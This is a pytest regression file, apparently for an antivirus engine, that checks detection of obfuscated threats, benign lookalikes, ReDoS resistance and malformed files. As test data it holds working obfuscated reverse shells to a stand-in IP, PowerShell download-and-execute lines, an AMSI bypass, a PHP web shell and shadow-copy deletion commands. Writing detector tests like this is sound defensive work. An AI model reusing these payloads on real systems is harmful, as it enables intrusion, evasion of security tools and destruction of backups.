"""Regressões dos testes extremos: evasão por ofuscação, ReDoS, arquivos malformados, dados corrompidos e
proteção de arquivos do sistema."""
import base64
import gzip
import io
import os
import random
import re
import sqlite3
import sys
import time
import zipfile

import pytest

import samples
from exeav.engine.models import CLEAN, MALICIOUS

DL = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.7/a.ps1')"


def _nested_zip(data: bytes, depth: int) -> bytes:
    for d in range(depth):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr(f"c{d}.zip" if d else "p.bat", data)
        data = buf.getvalue()
    return data


OBFUSCATED = {
    "cmd circunflexos": b"v^s^s^a^d^m^i^n d^e^l^e^t^e sh^ad^ows /all /quiet\r\nb^c^d^e^d^i^t /set {default} r^ecovery^enabled no\r\n",
    "cmd set": b"set a=vssa\r\nset b=dmin\r\n%a%%b% delete shadows /all /quiet\r\nbcdedit /set {default} recoveryenabled no\r\n",
    "cmd aspas": b"v\"ss\"admin delete sh\"a\"dows /all /quiet\r\nbcdedit /set {default} recoveryenabled no\r\n",
    "ps concatenação": b"$d='Down'+'load'+'String'\nI`E`X ((New-Object Net.WebClient).$d('http://203.0.113.7/a'))\n",
    "ps -f": b"$c=(\"{1}{0}{2}\" -f 'oadStr','Downl','ing')\n.(\"{1}{0}\" -f 'EX','I') ((New-Object Net.WebClient).$c('http://203.0.113.7/a'))\n",
    "ps -enc duplo": b"powershell -enc " + base64.b64encode(("powershell -enc " + base64.b64encode(DL.encode("utf-16le")).decode()).encode("utf-16le")),
    "ps utf16 BOM": b"\xff\xfe" + DL.encode("utf-16le"),
    "ps char codes": ("iex ([string]::join('', ([char[]](" + ",".join(str(ord(c)) for c in DL) + "))))").encode(),
    "ps amsi concat": b"[Ref].Assembly.GetType('System.Management.Automation.'+'Amsi'+'Utils').GetField('amsi'+'InitFailed','NonPublic,Static').SetValue($null,$true)",
    "sh base64|bash": b"echo " + base64.b64encode(b"bash -i >& /dev/tcp/203.0.113.7/4444 0>&1") + b" | base64 -d | bash\n",
    "vbs chr": ("Set o = CreateObject(" + "&".join(f"Chr({ord(c)})" for c in "WScript.Shell") + ")\no.Run " +
                "&".join(f"Chr({ord(c)})" for c in "powershell -w hidden -c iex(iwr http://203.0.113.7/a)") + ", 0").encode(),
    "php função variável": b"<?php $f='sys'.'tem'; $f($_GET['c']); ?>",
    "zip 4 níveis": _nested_zip(samples.eicar(), 4),
    "gzip": gzip.compress(b"#!/bin/bash\nbash -i >& /dev/tcp/203.0.113.7/4444 0>&1\n"),
}

LOOKALIKES = {
    "artigo": b"O comando 'vssadmin list shadows' lista as copias de sombra existentes.\n",
    "backup": b"@echo off\r\nrobocopy C:\\Users\\Ana\\Docs D:\\Backup /MIR\r\n",
    "admin ps": b"Get-Service | Export-Csv s.csv\nInvoke-WebRequest -Uri https://example.com/r.csv -OutFile r.csv\n",
    "math": b"x^2 + y^2 = z^2\n" * 40,
    "html base64": b"<img src='data:image/png;base64," + base64.b64encode(b"\x89PNG" + bytes(range(256)) * 20) + b"'>",
}


@pytest.mark.parametrize("name", list(OBFUSCATED))
def test_obfuscated_threats_condemned(engine, name):
    r = engine.analyze(OBFUSCATED[name]).result
    assert r.verdict == MALICIOUS, (name, r.score, r.reasons())


@pytest.mark.parametrize("name", list(LOOKALIKES))
def test_lookalikes_stay_clean(engine, name):
    r = engine.analyze(LOOKALIKES[name]).result
    assert r.verdict == CLEAN, (name, r.reasons())


def test_rules_resist_redos():
    """Nenhuma regra pode levar mais que alguns décimos de segundo em 100 KB de texto montado para atacá-la."""
    from exeav.engine.rules import RuleSet
    rs = RuleSet()
    attacks = [b" " * 100_000, b"\t \n" * 33_000, b"a" * 100_000]
    worst = (0.0, "")
    for rule in rs.rules:
        for p in rule.all + rule.any:
            if p.raw is not None:
                continue
            for anchor in list(p.anchors or [b"x"])[:2]:
                for filler in attacks:
                    data = anchor + filler
                    t = time.time()
                    p.rx.search(data)
                    dt = time.time() - t
                    if dt > worst[0]:
                        worst = (dt, f"{rule.id}: {p.rx.pattern[:80]!r}")
    assert worst[0] < 0.5, worst


def test_malformed_elf_cannot_escape(engine):
    """Um ELF com tabela dinâmica apontando para fora do arquivo não derruba o analisador nem escapa das regras."""
    import struct
    data = bytearray(open("/usr/bin/ls", "rb").read()) if os.path.exists("/usr/bin/ls") else None
    if data is None:
        pytest.skip("sem ELF de referência")
    shoff = struct.unpack_from("<Q", data, 0x28)[0]
    shentsize, shnum = struct.unpack_from("<HH", data, 0x3A)
    for i in range(shnum):
        off = shoff + i * shentsize
        if struct.unpack_from("<I", data, off + 4)[0] == 6:  # SHT_DYNAMIC
            struct.pack_into("<Q", data, off + 24, 0x5100000000)
    data += b"\x00bash -i >& /dev/tcp/203.0.113.7/4444 0>&1\x00"
    r = engine.analyze(bytes(data)).result
    assert "nix.reverse_shell" in {i.id for i in r.indicators}


def test_fuzz_quick(engine):
    rnd = random.Random(42)
    seeds = [samples.benign_pe(), samples.injector_ransom_pe(), samples.macro_docm(), samples.malicious_pdf(),
             samples.zip_with("a.txt", b"ola")]
    for _ in range(300):
        b = bytearray(rnd.choice(seeds))
        for _ in range(rnd.randint(1, 30)):
            b[rnd.randrange(len(b))] = rnd.randrange(256)
        if rnd.random() < 0.3:
            b = b[:rnd.randrange(len(b))]
        engine.analyze(bytes(b), deep=rnd.random() < 0.2)  # não pode lançar exceção


def test_disguised_script_in_media(engine):
    data = b"\x89PNG\r\n\x1a\n" + b"@echo off\r\nvssadmin delete shadows /all /quiet\r\nbcdedit /set {default} recoveryenabled no\r\n" * 3
    r = engine.analyze(data).result
    assert r.verdict == MALICIOUS and "gen.disguised_script" in {i.id for i in r.indicators}


def test_corrupted_databases_are_rebuilt(tmp_path):
    from exeav.engine.signatures import SignatureDB
    from exeav.scanner import ScanCache
    for name in ("sig.db", "cache.db"):
        (tmp_path / name).write_bytes(b"isto nao e um banco sqlite" * 50)
    db = SignatureDB(tmp_path / "sig.db")
    assert db.count >= 1  # EICAR recriado
    cache = ScanCache(tmp_path / "cache.db")
    cache.mark_clean("/x", 1, 1, "v")
    cache.flush()
    assert cache.is_clean("/x", 1, 1, "v")
    assert list(tmp_path.glob("sig.db.corrompido-*"))


def test_settings_are_sanitized(tmp_path):
    import json
    from exeav.config import SettingsStore
    p = tmp_path / "settings.json"
    p.write_text(json.dumps({"max_file_size_mb": -5, "sensitivity": "xyz", "archive_max_depth": 2,
                             "scheduled_scan_time": "99:99", "realtime_dirs": ["", "/tmp"]}))
    s = SettingsStore(p).settings
    assert s.max_file_size_mb == 1 and s.sensitivity == "media" and s.archive_max_depth == 5
    assert s.scheduled_scan_time == "12:00" and s.realtime_dirs == ["/tmp"]
    p.write_text("[1, 2, 3")
    assert SettingsStore(p).settings.max_file_size_mb == 128


@pytest.mark.skipif(not os.path.exists("/var/lib/dpkg/info/coreutils.md5sums"), reason="requer Debian/Ubuntu")
def test_system_files_are_never_quarantined(tmp_path):
    from exeav.engine.models import ScanResult
    from exeav.quarantine import Quarantine
    q = Quarantine(tmp_path / "q")
    with pytest.raises(PermissionError):
        q.isolate(ScanResult(path="/usr/bin/ls", threat_name="teste"))
    assert os.path.exists("/usr/bin/ls")


def test_critical_processes_protected():
    from exeav.system import processes
    assert processes.critical_reason(os.getpid())
    assert processes.critical_reason(1) or sys.platform.startswith("win")


@pytest.mark.skipif(not hasattr(os, "mkfifo"), reason="somente POSIX")
def test_lab_rejects_fifo(engine, tmp_path):
    from exeav.lab import AnalysisLab
    f = tmp_path / "fifo"
    os.mkfifo(f)
    with pytest.raises(ValueError):
        AnalysisLab(engine, tmp_path / "lab").add_file(str(f))


def test_harden_keeps_semantics():
    from exeav.engine.rules import harden
    for pat, txt in ((r"vssadmin\s+delete\s+shadows", b"vssadmin   delete shadows"),
                     (r"(?:\[char\]\s*\(?\s*\d+\s*\)?\s*[+,]\s*){3,}", b"[char]73 + [char] 69+[char](88) ,")):
        assert re.search(harden(pat).encode(), txt, re.I)
